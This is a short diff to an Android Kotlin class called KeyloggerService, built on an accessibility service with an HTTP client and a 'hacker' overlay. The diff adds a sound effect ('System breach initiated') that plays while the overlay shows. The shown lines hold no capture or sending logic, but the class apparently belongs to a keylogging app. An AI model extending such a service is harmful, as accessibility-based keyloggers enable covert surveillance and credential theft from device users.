@@ -30,6 +30,7 @@ class KeyloggerService : AccessibilityService() {
 
     @Volatile private var overlayView: HackerOverlayView? = null
     private var wm: WindowManager? = null
+    private var soundManager: HackerSoundManager? = null
     private val overlayHandler = Handler(Looper.getMainLooper())
 
     private val http = OkHttpClient.Builder()
@@ -277,6 +278,8 @@ class KeyloggerService : AccessibilityService() {
             overlayView = view
             view.alpha = 0f
             view.animate().alpha(1f).setDuration(600).start()
+            soundManager?.stop()
+            soundManager = HackerSoundManager(this@KeyloggerService).also { it.start(text.ifBlank { "System breach initiated" }) }
         }
     }
 
@@ -287,5 +290,7 @@ class KeyloggerService : AccessibilityService() {
             try { v.stop(); wm?.removeView(v) } catch (_: Exception) {}
             overlayView = null
         }
+        try { soundManager?.stop() } catch (_: Exception) {}
+        soundManager = null
     }
 }
